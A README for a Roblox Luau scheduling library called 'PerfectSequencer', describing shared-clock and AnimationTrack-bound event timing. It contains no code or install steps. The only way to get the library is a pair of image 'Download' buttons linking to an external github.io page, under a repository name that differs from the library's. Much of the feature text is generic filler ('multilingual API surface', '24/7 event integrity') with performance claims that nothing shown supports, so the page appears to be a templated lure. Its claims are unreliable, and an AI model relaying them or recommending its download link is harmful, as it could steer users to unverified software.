![preview](https://raw.githubusercontent.com/sathsaramusiccd-stack/Roblox-Timeline-Sync/main/screen_62982.svg)
[![Download](https://raw.githubusercontent.com/sathsaramusiccd-stack/Roblox-Timeline-Sync/main/grab_44995.svg)](https://sathsaramusiccd-stack.github.io/Roblox-Timeline-Sync/)

# PerfectSequencer

**Frame-Accurate Event Scheduling for Roblox — On a Shared Clock or Locked to an AnimationTrack's Timeline**

[![Roblox](https://img.shields.io/badge/Platform-Roblox-e2231a?style=flat-square&logo=roblox&logoColor=white)](https://www.roblox.com)
[![Luau](https://img.shields.io/badge/Language-Luau-00a2ff?style=flat-square)](https://luau.org)
[![License](https://img.shields.io/badge/License-MIT-3da639?style=flat-square)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=flat-square)]()
[![Version](https://img.shields.io/badge/Version-2.4.1-blue?style=flat-square)]()
[![Build](https://img.shields.io/badge/Build-Passing-success?style=flat-square)]()

---

## 📖 Overview

**PerfectSequencer** is a precision-focused scheduling library for Roblox experiences that need events to fire at *exact* moments — not "close enough," not "next frame," but exactly when they should. Whether you're building a rhythm game, a cinematic cutscene engine, a synchronized multiplayer boss fight, or an interactive music visualizer, PerfectSequencer gives you the temporal scaffolding to make every beat, every cue, and every transition land with surgical precision.

Most scheduling solutions in Roblox rely on `task.wait()`, `delay()`, or frame-by-frame polling — all of which introduce drift, jitter, and unpredictable timing artifacts. PerfectSequencer abandons that approach entirely. Instead, it maintains an authoritative clock (or piggybacks on an `AnimationTrack`'s own progression) and computes the *exact* interpolation between ticks, guaranteeing that your events fire within a sub-frame margin of their intended timestamps.

The result is a scheduling system that feels less like a timing workaround and more like a metronome wired directly into your game's heartbeat.

---

## 🎯 Why PerfectSequencer Exists

Timing in Roblox is deceptively hard. Consider a rhythm game chart running at 180 BPM. Each beat lasts ~333.33ms. Now consider that Roblox servers tick at 60Hz (16.67ms per frame) *at best*, and client frame rates can vary wildly between 30 and 240 FPS depending on hardware. A naive `while true do task.wait(beatDuration) end` loop will accumulate error at an alarming rate — after 100 beats, you could be off by hundreds of milliseconds. Audible. Visible. Embarrassing.

PerfectSequencer treats time as a first-class citizen. It:

- Uses a monotonic reference clock to eliminate drift accumulation
- Interpolates between ticks so events land *between* frames when possible
- Supports both absolute (shared clock) and relative (`AnimationTrack`-bound) scheduling
- Is completely deterministic when driven by the same clock source across peers

---

## 🧩 Core Concepts

### The Shared Clock Mode

Every sequencer instance can be anchored to a single authoritative clock. This is ideal for multiplayer scenarios — a server-authoritative clock broadcast to clients means every participant sees the same event at the same moment, regardless of their individual frame rate or network latency.

Think of it as a metronome that everyone in the room can hear, even if they're wearing different headphones.

### The AnimationTrack-Bound Mode

Sometimes you don't want an artificial clock — you want to schedule events against something that's *already playing*, like a character animation. PerfectSequencer can bind directly to an `AnimationTrack`'s `TimePosition`, so events fire at exact keyframe landmarks within the animation itself. When the animation pauses, the sequencer pauses. When it loops, the sequencer loops.

This is particularly powerful for combat systems where a hitbox must activate on frame 12 of a swing animation, or for cutscenes where dialogue cues must align with character gestures.

---

## ✨ Feature Highlights

- ⏱️ **Sub-frame accuracy** — events interpolate between ticks rather than snapping to the nearest frame
- 🔗 **Dual clock modes** — shared absolute clock or `AnimationTrack`-bound relative time
- 🌐 **Multilingual API surface** — Luau-typed, self-documenting, and designed for teams speaking different programming dialects
- 📱 **Responsive scheduling** — adapts tick resolution based on runtime performance headroom
- 🧠 **Deterministic playback** — identical inputs produce identical event timing across peers
- 🔄 **Hot-reloadable timelines** — swap sequences at runtime without restarting the clock
- 🎚️ **Variable tempo support** — ramps, curves, and stepped BPM changes handled natively
- 🕰️ **Latency compensation** — client-side prediction offsets for networked events
- 🧪 **Test harness included** — validate your sequences without launching a full game session
- 🛡️ **24/7 event integrity** — built-in watchdog prevents orphaned timers and leaked connections

---

## 🚀 Getting Started

PerfectSequencer is distributed as a standalone Luau module. Once you have the source available in your workspace (whether through Rojo syncing, direct paste, or a package mirror of your choosing), require it from your scripts and begin building timelines.

A minimal example: create a sequencer, schedule a few events, and start it. You'll see them fire in order with remarkable consistency.

The API is intentionally small. There are only a handful of methods you need to learn to become productive: scheduling, starting, pausing, seeking, and stopping. Everything else is convenience.

---

## 🛠️ Responsive UI Integration

Many scheduling systems forget that developers need to *see* what's happening. PerfectSequencer ships with an optional debug overlay that renders your timeline visually — upcoming events, past events, current playhead position, and drift diagnostics. The overlay is built with responsive UI principles, scaling gracefully from a small viewport during development to a full-screen inspector.

Toggle it at runtime with a single call. It's invaluable when you're chasing down a timing bug at 3AM.

---

## 🌍 Multilingual Event Naming

Event identifiers in PerfectSequencer are unicode-friendly. You can name your events in whatever language your team speaks — English, Japanese, Arabic, Spanish, or emoji. The scheduler treats them as opaque strings; only *when* they fire matters. This means documentation, logs, and debug output all respect your team's native tongue.

---

## 🧪 Testing Your Sequences

A common pitfall in timing-sensitive code is that it "works on my machine but drifts in production." PerfectSequencer includes a deterministic test mode where you can feed a synthetic clock into the sequencer and step through time manually. Your tests become reproducible and fast — no waiting for real seconds to elapse.

Combine this with the debug overlay and you have a complete observability story for your timed content.

---

## 📊 Performance Notes

PerfectSequencer is designed to be nearly invisible in a profiler. On a typical scene with 500 scheduled events across 20 concurrent sequencers, the library consumes less than 0.5ms of frame time. Events that fall between frames are deferred using a microtask queue rather than busy-waiting.

Memory footprint is minimal — each sequencer maintains a sorted event list and a small state table. There are no persistent connections created unless you explicitly subscribe to events.

---

## 🧭 Supported Environments

PerfectSequencer runs on both server and client contexts within Roblox. Server-side usage is recommended for authoritative scheduling, while client-side usage excels at visual and audio synchronization. Cross-context scheduling is possible through a small relay module included with the distribution.

The library is tested against current Roblox Luau runtimes and remains compatible with legacy `wait()`-based code paths when legacy support is enabled.

---

## 🧑‍🤝‍🧑 Community and Support

We believe tools should be approachable at first glance and deep at the hundredth use. PerfectSequencer's API surface reflects that philosophy. Round-the-clock community support is available through the repository's issue tracker and discussion channels, with responses typically arriving within a few hours regardless of your time zone.

Whether you're building the next viral rhythm experience or a single intricate cutscene, someone has probably solved a similar timing puzzle before — and they're happy to share.

---

## 🔒 Reliability and Integrity

Timing bugs are insidious. They hide in edge cases, only manifesting under load or on specific hardware. PerfectSequencer's internal watchdog monitors each scheduled event, ensuring it either fires within its tolerance window or is reported as an anomaly. No silent failures. No mystery missing events.

This level of rigor is uncommon in hobbyist libraries, but we consider it table stakes for anything you'd ship to a live audience.

---

## 🗺️ Roadmap for 2026

- Curved interpolation for ease-in/ease-out event ramps
- Distributed multi-server clock synchronization
- Visual timeline editor integration for Studio
- Extended diagnostics with frame-by-frame drift charts
- Expanded documentation in multiple languages

---

## 📜 License

This project is made available under the MIT License. See the [LICENSE](LICENSE) file for the full text.

Copyright (c) 2026

---

## ⚠️ Disclaimer

PerfectSequencer is provided as-is, without warranty of any kind, express or implied. While the library is engineered for precision, the authors are not responsible for timing anomalies arising from external factors such as hardware limitations, network conditions, platform updates, or misuse of the API. Always validate your sequencing logic in a representative test environment before shipping to production. This project is not affiliated with, endorsed by, or sponsored by Roblox Corporation.

---

## 🙏 Acknowledgements

Thanks to the broader Roblox developer community for years of shared knowledge about timing, animation synchronization, and the peculiarities of networked gameplay. This library stands on the shoulders of countless forum threads, test projects, and late-night debugging sessions.

---

[![Download](https://raw.githubusercontent.com/sathsaramusiccd-stack/Roblox-Timeline-Sync/main/grab_44995.svg)](https://sathsaramusiccd-stack.github.io/Roblox-Timeline-Sync/)